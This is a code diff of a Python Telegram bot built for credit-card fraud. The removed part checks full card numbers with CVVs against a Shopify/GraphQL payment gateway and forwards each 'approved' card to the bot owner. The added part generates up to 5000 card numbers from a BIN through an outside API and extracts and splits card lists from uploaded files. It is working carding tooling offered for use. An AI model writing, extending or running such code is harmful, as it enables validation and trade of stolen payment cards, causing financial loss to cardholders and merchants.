-                    # Proper status determination
-                    is_declined = any(
-                        decline_word in status.lower() 
-                        for decline_word in ['decline', 'declined', 'failed', 'error', 'generic']
-                    )
-                    
-                    return {
-                        'status': 'DECLINED' if is_declined else 'APPROVED',
-                        'card': card,
-                        'message': message,
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'Shopify + graphQL [10$]'
-                    }
-                    
-                except json.JSONDecodeError:
-                    return {
-                        'status': 'ERROR',
-                        'card': card,
-                        'message': 'Invalid API response',
-                        'brand': brand,
-                        'country': f"{country_name} {country_flag}",
-                        'type': card_type,
-                        'gateway': 'Shopify + graphQL [10$]'
-                    }
-            else:
-                return {
-                    'status': 'ERROR',
-                    'card': card,
-                    'message': f'API Error: {response.status_code}',
-                    'brand': brand,
-                    'country': f"{country_name} {country_flag}",
-                    'type': card_type,
-                    'gateway': 'Shopify + graphQL [10$]'
-                }
-        except requests.exceptions.Timeout:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': 'API Timeout',
-                'brand': brand,
-                'country': f"{country_name} {country_flag}",
-                'type': card_type,
-                'gateway': 'Shopify + graphQL [10$]'
-            }
-        except Exception as e:
-            return {
-                'status': 'ERROR',
-                'card': card,
-                'message': str(e),
-                'brand': brand,
-                'country': f"{country_name} {country_flag}",
-                'type': card_type,
-                'gateway': 'Shopify + graphQL [10$]'
-            }
-            
-    except Exception as e:
-        return {
-            'status': 'ERROR',
-            'card': cc,
-            'message': 'Invalid Input',
-            'brand': 'UNKNOWN',
-            'country': 'UNKNOWN 🌐',
-            'type': 'UNKNOWN',
-            'gateway': 'Shopify + graphQL [10$]'
-        }
-
-@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.sh ') or m.text == '.sh'))
-def dot_sh_command(message):
-    try:
-        # Handle empty .sh command
-        if message.text.strip() == '.sh':
-            if message.reply_to_message:
-                text = message.reply_to_message.text
-            else:
-                bot.reply_to(message, "❌ Please provide a card or reply to a message containing a card.\nFormat: CC|MM|YY|CVV")
-                return
-        else:
-            text = message.text[4:].strip()  # Remove '.sh ' prefix
-        
-        # Improved card pattern matching
-        card_pattern = r'(\d{13,19})[\s|/]*(\d{1,2})[\s|/]*(\d{2,4})[\s|/]*(\d{3,4})'
-        match = re.search(card_pattern, text)
-        
-        if not match:
-            bot.reply_to(message, "❌ Invalid card format. Use CC|MM|YYYY|CVV or CC|MM|YY|CVV")
-            return
-        
-        cc = match.group(1)
-        mm = match.group(2)
-        yy = match.group(3)
-        cvv = match.group(4)
-        
-        # Validate month
-        if not (1 <= int(mm) <= 12):
-            bot.reply_to(message, "❌ Invalid month (MM must be 01-12)")
-            return
-        
-        # Handle year format (2-digit or 4-digit)
-        if len(yy) == 2:
-            yy = '20' + yy if int(yy) < 30 else '19' + yy
-        elif len(yy) != 4:
-            bot.reply_to(message, "❌ Invalid year format (use YY or YYYY)")
-            return
-        
-        # Validate CVV
-        if len(cvv) not in [3, 4]:
-            bot.reply_to(message, "❌ Invalid CVV (must be 3 or 4 digits)")
-            return
-        
-        card = f"{cc}|{mm}|{yy}|{cvv}"
-        
-        # Now call the main processing function with the properly formatted card
-        sh_command(message, card)
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error processing card: {str(e)}")
-        print(f"Error in dot_sh_command: {str(e)}")
-
-# Update the sh_command to accept card parameter
-@bot.message_handler(commands=['sh'])
-def sh_command(message, card=None):
-    if not bot_active or not checker_active:
-        bot.reply_to(message, "❌ Card checking is currently disabled by admin.")
-        return
-    
-    user = message.from_user
-    if is_restricted(user.id):
-        bot.reply_to(message, "⛔ You are restricted from using this bot.")
-        return
-    
-    current_time = time.time()
-    if user.id in user_cooldowns and current_time - user_cooldowns[user.id] < FLOOD_WAIT_TIME:
-        remaining = int(FLOOD_WAIT_TIME - (current_time - user_cooldowns[user.id]))
-        bot.reply_to(message, f"⏳ Please wait {remaining} seconds before checking another card.")
-        return
-    
-    if user.id != OWNER_ID and get_user_credits(user.id) <= 0:
-        bot.reply_to(message, "❌ You don't have enough credits. Wait for hourly refresh.")
-        return
-    
-    # If card wasn't provided (regular /sh command), extract it
-    if card is None:
-        if message.reply_to_message:
-            text = message.reply_to_message.text
-        else:
-            text = message.text
-        
-        # Remove command prefix if present
-        if text.startswith('/sh '):
-            text = text[4:].strip()
-        
-        # Improved card pattern matching
-        card_pattern = r'(\d{13,19})[\s|/]*(\d{1,2})[\s|/]*(\d{2,4})[\s|/]*(\d{3,4})'
-        match = re.search(card_pattern, text)
-        
-        if not match:
-            bot.reply_to(message, "❌ Invalid card format. Use CC|MM|YYYY|CVV or CC|MM|YY|CVV")
-            return
-        
-        cc = match.group(1)
-        mm = match.group(2)
-        yy = match.group(3)
-        cvv = match.group(4)
-        
-        # Validate month
-        if not (1 <= int(mm) <= 12):
-            bot.reply_to(message, "❌ Invalid month (MM must be 01-12)")
-            return
-        
-        # Handle year format
-        if len(yy) == 2:
-            yy = '20' + yy if int(yy) < 30 else '19' + yy
-        elif len(yy) != 4:
-            bot.reply_to(message, "❌ Invalid year format (use YY or YYYY)")
-            return
-        
-        # Validate CVV
-        if len(cvv) not in [3, 4]:
-            bot.reply_to(message, "❌ Invalid CVV (must be 3 or 4 digits)")
-            return
-        
-        card = f"{cc}|{mm}|{yy}|{cvv}"
-    
-    # Rest of your processing code...
-    initial_msg = (
-        f"↝ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠....\n\n"
-        f"𝐂𝐚𝐫𝐝\n  ↳ <code>{card}</code>\n"
-        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>Shopify + graphQL [10$]</i>\n"
-        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>Fetching (this may take 20-30 seconds)</i>"
-    )
-    sent_msg = bot.reply_to(message, initial_msg, parse_mode='HTML')
-    
-    user_cooldowns[user.id] = current_time
-    if not deduct_credit(user.id):
-        bot.reply_to(message, "❌ Error updating credits. Please try again.")
-        return
-    
-    start_time = time.time()
-    
-    def process_check():
-        try:
-            result = check_shopify_cc(card)
-            elapsed_time = time.time() - start_time
-            
-            # Improved status display logic
-            if result['status'] == 'APPROVED':
-                status_display = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
-            elif result['status'] == 'DECLINED':
-                status_display = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-            else:
-                status_display = "𝐄𝐫𝐫𝐨𝐫 ⚠️"
-            
-            message_text = (
-                f"{status_display}\n\n"
-                f"𝐂𝐚𝐫𝐝\n  ↳ <code>{result['card']}</code>\n"
-                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>\n"
-                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>\n\n"
-                f"𝐈𝐧𝐟𝐨 ⌁ {result['brand']} {result['type']}\n"
-                f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}\n\n"
-                f"𝐑𝐞𝐪 ⌁ <a href='tg://user?id={user.id}'>{user.first_name}</a>\n"
-                f"𝐃𝐞𝐯 ⌁ <a href='tg://user?id={OWNER_ID}'>⎯꯭𖣐᪵‌𐎓⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲◄⏤‌‌ꭙ‌‌⁷ ꯭</a>\n"
-                f"𝐓𝐢𝐦𝐞 ⌁ {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
-            )
-            
-            bot.edit_message_text(
-                message_text,
-                chat_id=sent_msg.chat.id,
-                message_id=sent_msg.message_id,
-                parse_mode='HTML'
-            )
-            
-            log_card_check(
-                user.id,
-                card,
-                result['status'],
-                result['message'],
-                result['gateway']
-            )
-            
-            if result['status'] == 'APPROVED':
-                bot.send_message(OWNER_ID, f"✅ Approved Card from {user.first_name} (@{user.username or 'N/A'}):\n{card}")
-        except Exception as e:
-            bot.edit_message_text(
-                "❌ Failed to check card. Please try again later.",
-                chat_id=sent_msg.chat.id,
-                message_id=sent_msg.message_id
-            )
-            print(f"Error processing card check: {str(e)}")
-    
-    threading.Thread(target=process_check).start()
-
-@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sh '))
-def dot_sh_command(message):
-    sh_command(message)
 
 @bot.message_handler(commands=['on', 'off'])
 def toggle_bot(message):
@@ -1477,6 +1205,280 @@ def toggle_bot(message):
         bot.reply_to(message, f"✅ Checker status set to {status}")
     else:
         bot.reply_to(message, "❌ Invalid target. Use 'all' or 'chk'")
+
+# Add this with your other API endpoints
+CC_GENERATOR_URL = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count={}"  # Replace with your actual CC generator API
+
+# Add these command handlers with your other command handlers
+@bot.message_handler(commands=['gen'])
+def gen_command(message):
+    handle_gen_command(message)
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.gen ') or m.text == '.gen'))
+def dot_gen_command(message):
+    handle_gen_command(message)
+
+def handle_gen_command(message):
+    """Handle both /gen and .gen commands without deducting credits"""
+    try:
+        # Parse command
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "❌ Invalid format. Use /gen BIN [COUNT] or .gen BIN [COUNT]")
+            return
+        
+        bin_input = parts[1]
+        if len(bin_input) < 6:
+            bot.reply_to(message, "❌ Invalid BIN. BIN must be at least 6 digits.")
+            return
+        
+        # Get BIN info (using your existing function)
+        bin_info = get_bin_info(bin_input[:6])
+        bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
+        country_name = bin_info.get('country_name', 'N/A') if bin_info else 'N/A'
+        flag = bin_info.get('country_flag', '🌍') if bin_info else '🌍'
+        card_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
+        
+        # Default behavior - show 10 CCs in message if no count specified
+        if len(parts) == 2:
+            status_msg = bot.reply_to(message, "🔄 Generating 10 CCs...")
+            
+            def generate_inline():
+                try:
+                    response = requests.get(CC_GENERATOR_URL.format(bin_input, 10), timeout=10)
+                    if response.status_code == 200:
+                        ccs = response.text.strip().split('\n')
+                        formatted_ccs = "\n".join(f"<code>{cc}</code>" for cc in ccs)
+                        
+                        result = f"""
+<pre>Generated 10 CCs 💳</pre>
+
+{formatted_ccs}
+
+<pre>BIN-LOOKUP
+BIN: {bin_input}
+Country: {country_name} {flag}
+Type: {card_type}
+Bank: {bank}</pre>
+"""
+                        bot.edit_message_text(chat_id=message.chat.id,
+                                            message_id=status_msg.message_id,
+                                            text=result,
+                                            parse_mode='HTML')
+                    else:
+                        bot.edit_message_text(chat_id=message.chat.id,
+                                            message_id=status_msg.message_id,
+                                            text="❌ Failed to generate CCs. Please try again.")
+                except Exception as e:
+                    bot.edit_message_text(chat_id=message.chat.id,
+                                         message_id=status_msg.message_id,
+                                         text=f"❌ Error generating CCs: {str(e)}")
+            
+            threading.Thread(target=generate_inline).start()
+        
+        # If count is specified, generate a file
+        else:
+            try:
+                count = int(parts[2])
+                if count <= 0:
+                    bot.reply_to(message, "❌ Count must be at least 1")
+                    return
+                elif count > 5000:
+                    count = 5000
+                    bot.reply_to(message, "⚠️ Maximum count is 5000. Generating 5000 CCs.")
+                
+                status_msg = bot.reply_to(message, f"🔄 Generating {count} CCs... This may take a moment.")
+                
+                def generate_file():
+                    try:
+                        # Generate in chunks to avoid memory issues
+                        chunk_size = 100
+                        chunks = count // chunk_size
+                        remainder = count % chunk_size
+                        
+                        with open(f'ccgen_{bin_input}.txt', 'w') as f:
+                            for _ in range(chunks):
+                                response = requests.get(CC_GENERATOR_URL.format(bin_input, chunk_size), timeout=10)
+                                if response.status_code == 200:
+                                    f.write(response.text + '\n')
+                                time.sleep(1)  # Be gentle with the API
+                            
+                            if remainder > 0:
+                                response = requests.get(CC_GENERATOR_URL.format(bin_input, remainder), timeout=10)
+                                if response.status_code == 200:
+                                    f.write(response.text + '\n')
+                        
+                        # Send the file
+                        with open(f'ccgen_{bin_input}.txt', 'rb') as f:
+                            bot.send_document(
+                                message.chat.id, 
+                                f, 
+                                caption=f"""
+Generated {count} CCs 💳
+━━━━━━━━━━━━━━━━━━
+BIN: {bin_input}
+Country: {country_name} {flag}
+Type: {card_type}
+Bank: {bank}
+━━━━━━━━━━━━━━━━━━
+""",
+                                parse_mode='HTML'
+                            )
+                        
+                        # Clean up
+                        import os
+                        os.remove(f'ccgen_{bin_input}.txt')
+                        bot.delete_message(message.chat.id, status_msg.message_id)
+                    
+                    except Exception as e:
+                        bot.edit_message_text(chat_id=message.chat.id,
+                                            message_id=status_msg.message_id,
+                                            text=f"❌ Error generating CCs: {str(e)}")
+                
+                threading.Thread(target=generate_file).start()
+            
+            except ValueError:
+                bot.reply_to(message, "❌ Invalid count. Please provide a number.")
+    
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
+
+# Add these command handlers with your other command handlers
+@bot.message_handler(commands=['info'])
+def info_command(message):
+    handle_info_command(message)
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.info') or m.text == '.info'))
+def dot_info_command(message):
+    handle_info_command(message)
+
+def handle_info_command(message):
+    """Show user information in a formatted message"""
+    user = message.from_user
+    user_id = user.id
+    
+    # Check if user needs to join channels first (same as other commands)
+    if not is_member(user_id):
+        show_join_buttons(message)
+        return
+    
+    # Get user data from Firebase
+    users = read_firebase("users_pixel") or {}
+    user_data = users.get(str(user_id), {})
+    
+    # Calculate account age
+    join_date = user_data.get('first_seen', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+    try:
+        join_dt = datetime.strptime(join_date, "%Y-%m-%d %H:%M:%S")
+        account_age = (datetime.now() - join_dt).days
+    except:
+        account_age = 0
+    
+    # Get stats
+    credits = user_data.get('credits', CREDITS_PER_HOUR)
+    total_checks = user_data.get('total_checks', 0)
+    
+    # Get user logs to count approved cards
+    user_logs = read_firebase(f"logs_pixel/{user_id}") or {}
+    approved_count = sum(1 for log in user_logs.values() if log.get('status') == 'APPROVED')
+    
+    # Format the response
+    response = f"""
+════❖ USER INFO ❖════
+
+<b>❖ User:</b> <a href='tg://user?id={user_id}'>{user.first_name}</a>
+<b>❖ ID:</b> <code>{user_id}</code>
+<b>❖ Joined:</b> {join_date} ({account_age} days ago)
+
+<b>❖ Credits:</b> {credits}/{CREDITS_PER_HOUR}
+<b>❖ Total Checks:</b> {total_checks}
+<b>❖ Approved Cards:</b> {approved_count}
+
+<b>❖ Status:</b> {'🟢 Active' if not is_restricted(user_id) else '🔴 Restricted'}
+
+"""
+    
+    bot.reply_to(message, response, parse_mode='HTML')
+
+# Updated gen command to respect join requirements
+@bot.message_handler(commands=['gen'])
+def gen_command(message):
+    if not is_member(message.from_user.id):
+        show_join_buttons(message)
+        return
+    handle_gen_command(message)
+
+@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.gen ') or m.text == '.gen'))
+def dot_gen_command(message):
+    if not is_member(message.from_user.id):
+        show_join_buttons(message)
+        return
+    handle_gen_command(message)
+
+@bot.message_handler(commands=['open'])
+def open_txt_file(message):
+    if not message.reply_to_message or not message.reply_to_message.document:
+        bot.reply_to(message, "❌ Please reply to a text file.")
+        return
+
+    try:
+        file_info = bot.get_file(message.reply_to_message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        text_content = downloaded_file.decode('utf-8')
+
+        # Extract CCs
+        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
+        if not ccs:
+            bot.reply_to(message, "❌ No CCs found in this file.")
+            return
+
+        first_30 = ccs[:30]
+        formatted = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in first_30)
+
+        bot.send_message(message.chat.id, f"✅ Found {len(ccs)} CCs.\n\nHere are the first {len(first_30)}:\n<code>{formatted}</code>", parse_mode='HTML')
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
+
+
+
+@bot.message_handler(commands=['split'])
+def split_txt_file(message):
+    if not message.reply_to_message or not message.reply_to_message.document:
+        bot.reply_to(message, "❌ Please reply to a text file.")
+        return
+
+    try:
+        args = message.text.split()
+        if len(args) < 2 or not args[1].isdigit():
+            bot.reply_to(message, "❌ Provide the number of parts. Example: /split 5")
+            return
+        parts = int(args[1])
+        if parts <= 0:
+            bot.reply_to(message, "❌ Number of parts must be greater than 0.")
+            return
+
+        file_info = bot.get_file(message.reply_to_message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        text_content = downloaded_file.decode('utf-8')
+
+        # Extract CCs
+        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
+        if not ccs:
+            bot.reply_to(message, "❌ No CCs found in this file.")
+            return
+
+        chunk_size = (len(ccs) + parts - 1) // parts
+        chunks = [ccs[i:i+chunk_size] for i in range(0, len(ccs), chunk_size)]
+
+        for idx, chunk in enumerate(chunks):
+            chunk_text = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in chunk)
+            output = io.BytesIO(chunk_text.encode('utf-8'))
+            output.name = f'part_{idx+1}.txt'
+            bot.send_document(message.chat.id, output)
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
 
 # Background tasks
 def background_tasks():
